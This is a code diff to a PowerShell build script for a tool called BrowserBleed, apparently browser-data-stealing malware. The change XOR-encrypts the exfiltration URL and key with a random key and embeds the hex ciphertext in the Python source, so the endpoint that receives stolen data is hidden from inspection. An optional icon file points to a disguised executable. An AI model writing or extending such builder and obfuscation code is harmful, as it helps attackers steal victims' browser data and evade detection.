@@ -261,11 +261,29 @@ if ($IconFile) { Write-Host "    Icon:         $IconFile" }
 $src    = Join-Path $PSScriptRoot "BrowserBleed.py"
 $tmpSrc = Join-Path $env:TEMP "BrowserBleed_build.py"
 
+$rng = [System.Security.Cryptography.RandomNumberGenerator]::Create()
+$xorKey = New-Object byte[] 32
+$rng.GetBytes($xorKey)
+$keyHex = -join ($xorKey | ForEach-Object { $_.ToString('x2') })
+
+function Get-XorHex([string]$plain, [byte[]]$key) {
+    $bytes = [System.Text.Encoding]::UTF8.GetBytes($plain)
+    $out = New-Object byte[] $bytes.Length
+    for ($i = 0; $i -lt $bytes.Length; $i++) {
+        $out[$i] = $bytes[$i] -bxor $key[$i % $key.Length]
+    }
+    return -join ($out | ForEach-Object { $_.ToString('x2') })
+}
+
+$urlEnc = Get-XorHex $ExfilUrl $xorKey
+$keyEnc = Get-XorHex $ExfilKey $xorKey
+
 $patched = (Get-Content $src -Raw -Encoding utf8) `
-    -replace '_EXFIL_URL: str = ""', "_EXFIL_URL: str = `"$ExfilUrl`"" `
-    -replace '_EXFIL_KEY: str = ""', "_EXFIL_KEY: str = `"$ExfilKey`""
-if ($patched -notmatch [regex]::Escape($ExfilUrl) -or $patched -notmatch [regex]::Escape($ExfilKey)) {
-    Write-Error "Substitution failed - URL/key not found in patched source. Aborting."
+    -replace '_EXFIL_URL_ENC: str = ""', "_EXFIL_URL_ENC: str = `"$urlEnc`"" `
+    -replace '_EXFIL_KEY_ENC: str = ""', "_EXFIL_KEY_ENC: str = `"$keyEnc`"" `
+    -replace '_EXFIL_XOR_KEY: str = ""', "_EXFIL_XOR_KEY: str = `"$keyHex`""
+if ($patched -notmatch [regex]::Escape($urlEnc) -or $patched -notmatch [regex]::Escape($keyHex)) {
+    Write-Error "Substitution failed - encrypted values not found in patched source. Aborting."
     exit 1
 }
 $patched | Set-Content -Path $tmpSrc -Encoding utf8
